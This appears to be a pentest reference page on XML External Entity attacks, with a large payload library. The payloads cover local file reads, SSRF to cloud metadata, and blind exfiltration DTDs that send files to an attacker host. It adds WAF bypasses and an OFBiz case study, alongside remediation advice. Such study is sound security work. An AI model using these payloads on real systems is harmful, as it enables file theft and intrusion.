---
type: technique
title: XML External Entities (XXE)
lang: en
status: active
wstg: ["WSTG-INPV-07"]
owasp_top10: ["A05:2021"]
owasp_api: []
asvs: ["V1.5.1"]
cwe: ["CWE-611"]
attack: []
cvss: ""
sources: [web-200-oswa, payloadsallthethings]
updated: 2026-09-17
---

# XML External Entities (XXE)

**TL;DR** — If an XML parser resolves a document's DTD and **external entities**, an
attacker who controls XML input can make the server read local files, perform requests on
its behalf (SSRF), or exfiltrate data out-of-band. Root cause: a parser configured to
process external entities.

> Framework: **A05:2021 – Security Misconfiguration** (XXE), `CWE-611`. WSTG + ASVS IDs in frontmatter (WSTG 4.2 / ASVS 5.0, verified).
> See [[xml-entities]] for the entity mechanics.

## Where it applies

Anywhere XML is parsed: SOAP services, SAML, REST endpoints accepting `application/xml`,
file formats that are really XML (`.docx`, `.xlsx`, `.svg`), and **XML import/export**
features. XML's `<`/`>` structure makes it easy to spot XML bodies in [[burp-suite|Burp]].

## How it works

A DTD can declare an entity that the parser expands. An **external** entity pulls its value
from a URI the server resolves:

```xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<r>&xxe;</r>          <!-- parser substitutes the file's contents where &xxe; appears -->
```

## Testing

- **In-band** — inject an external entity and reference it in a field whose value is
  reflected back; the file content appears in the response.
- **Error-based** — force the file content into a parser error message when it isn't
  reflected (e.g. reference a non-existent local DTD / trigger a type/length error).
- **Out-of-band (blind)** — no reflection, no useful errors: use a **parameter entity** and
  an attacker-hosted external DTD to exfiltrate data over HTTP/FTP:

  ```xml
  <!DOCTYPE r [
    <!ENTITY % ext SYSTEM "http://10.10.14.5/evil.dtd"> %ext;
  ]>
  ```
  where `evil.dtd` reads a file into a parameter entity and appends it to a URL the server
  requests back to you.

## Exploitation

- **File read** — `file:///etc/passwd`, source, config, secrets.
- **SSRF** — `SYSTEM "http://169.254.169.254/…"` to reach internal services / cloud
  metadata (see [[ssrf]]).
- **DoS** — entity-expansion ("billion laughs") — note but don't fire on a live target.

## File-upload & document XXE

Many formats are XML underneath, so an upload feature can be the vector:

- **SVG** avatar/image with a DTD + external entity.
- **OOXML** (`.docx`/`.xlsx`/`.pptx`) — zipped XML; inject into an internal part and re-zip.
- **SOAP / SAML / RSS** endpoints parse XML too.

### Blind (out-of-band) exfiltration

No reflection, no error? Host an external DTD and chain parameter entities to beacon the
file back over HTTP:

```xml
<!-- evil.dtd on the attacker host -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrap "<!ENTITY &#x25; out SYSTEM 'http://ATTACKER/?x=%file;'>">
%wrap; %out;
```

The target document pulls in `%ext;` (→ `http://ATTACKER/evil.dtd`), which reads the file
and sends it to your listener.

## Payload library

All inert; swap `/etc/passwd` for the target file and `ATTACKER_HOST` for your listener.
Fuller set: [[payloadsallthethings|PaTT]].

**Detection — entity echo** (expect the entity value reflected):

```xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY test "XXE-OK"> ]>
<root><name>&test;</name></root>
```

**In-band file read** (Linux / Windows):

```xml
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><root>&xxe;</root>
```
```xml
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]><root>&xxe;</root>
```

**Read files that break XML** (PHP source, awkward chars) via `php://filter` / `data://`:

```xml
<!DOCTYPE r [ <!ENTITY xxe SYSTEM
  "php://filter/convert.base64-encode/resource=index.php"> ]><root>&xxe;</root>
```
```xml
<!DOCTYPE r [ <!ENTITY % init SYSTEM
  "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><r/>
```

**SSRF via XXE** — point the entity at an internal URL / [[ssrf|metadata]]:

```xml
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]><root>&xxe;</root>
```

**XInclude** — when you can't add a DOCTYPE (input inserted into a server-side XML doc):

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/></foo>
```

**Blind OOB exfil** — attacker-hosted external DTD + parameter entities. Trigger:

```xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY % ext SYSTEM "http://ATTACKER_HOST/x.dtd"> %ext; ]><r></r>
```
`x.dtd` — error-based leak (filename appears in the parser error):

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
`x.dtd` — HTTP exfil variant (sends the file in the query string):

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM 'http://ATTACKER_HOST/?x=%file;'>">
%wrap; %send;
```

**Error-based via a LOCAL DTD** — no outbound needed; reuse a DTD already on disk and
redefine an entity it references:

```xml
<!DOCTYPE r [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
  <!ENTITY % constant 'aaa)>
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///x/%file;&#x27;>">
    &#x25;eval; &#x25;error;
    <!ELEMENT aa (bb'>
  %local_dtd;
]><r>x</r>
```
Present-by-default DTDs to probe: `/usr/share/xml/svg/svg11.dtd`,
`/usr/share/yelp/dtd/docbookx.dtd` (Linux); `C:\Windows\System32\wbem\xml\cim20.dtd` (Windows).

**Upload / document XXE** — inject into any XML-backed format:

```xml
<!-- SVG avatar/image (rendered server-side) -->
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg xmlns="http://www.w3.org/2000/svg"><text x="0" y="16">&xxe;</text></svg>
```
OOXML (`.docx`/`.xlsx`/`.pptx`) — unzip, inject the OOB trigger into an inner part
(`word/document.xml`, `xl/workbook.xml`, `[Content_Types].xml`), then **`zip -u`** to keep a
valid signature (tools: `oxml_xxe`, `docem`).

**WAF bypass** — re-encode to UTF-16 to dodge signatures, or flip a JSON endpoint to XML:

```bash
iconv -f UTF-8 -t UTF-16BE exploit.xml > exploit-utf16.xml   # then send as the XML body
```
On a JSON API, set `Content-Type: application/xml` with an XML body — many stacks parse both.

## Worked example — Apache OFBiz XML import

From [[web-200-oswa]] (Apache OFBiz, Java). OFBiz's *Web Tools → Entity XML Tools* expose
XML import/export. The straightforward "export to browser" path errors out
(`StackOverflowError`), so — as in a black-box test — the attack uses **Programmable
Export / Import**: submit an `entity-engine-xml` document defining a product, with a DTD
declaring `<!ENTITY xxe SYSTEM "file:///…">` and referencing `&xxe;` inside a text field
such as `<longDescription>`. The import succeeds silently; **searching the catalogue for
that product** then renders the field, revealing the file content the entity pulled in — a
stored/blind retrieval channel. Java-specific errors (e.g. timestamp/format exceptions)
guide field selection during discovery.

## Confirming impact

Retrieve a local file (`/etc/passwd`, an app secret) or demonstrate an internal request
(SSRF). Impact: sensitive file disclosure, internal network access, sometimes RCE.

## Remediation

- **Disable DTDs / external entities** in the parser (the definitive fix). Language-specific:
  set `FEATURE_SECURE_PROCESSING`, `disallow-doctype-decl` (Java), `libxml_disable_entity_loader`
  / no `LIBXML_NOENT` (PHP), `defusedxml` (Python), etc.
- Prefer non-XML formats (JSON) where possible; validate/allowlist; least-privilege file &
  network access on the parsing host.

## Quick checklist

- [ ] XML anywhere? `Content-Type: application/xml`/SOAP/SAML, or an XML-backed upload (svg/docx/xlsx).
- [ ] Entity echo reflected → in-band `file://`; else error-based; else **blind OOB** (external DTD).
- [ ] PHP source / awkward bytes → `php://filter` base64. Internal reach → `http://` entity (SSRF/[[ssrf|metadata]]).
- [ ] Outbound blocked → **local-DTD error-based**. JSON-only → flip to XML. Signature WAF → UTF-16.
- [ ] Confirm with `/etc/passwd` (Linux) / `win.ini` (Windows); note SSRF + file-read reach.

## See also

[[xml-entities]] · [[ssrf]] · [[directory-traversal]] · [[burp-suite]]

*Sources: [[web-200-oswa]] module 11 (OFBiz case study); [[payloadsallthethings]] (payload library, local-DTD error-based, OOXML/UTF-16 bypass).*
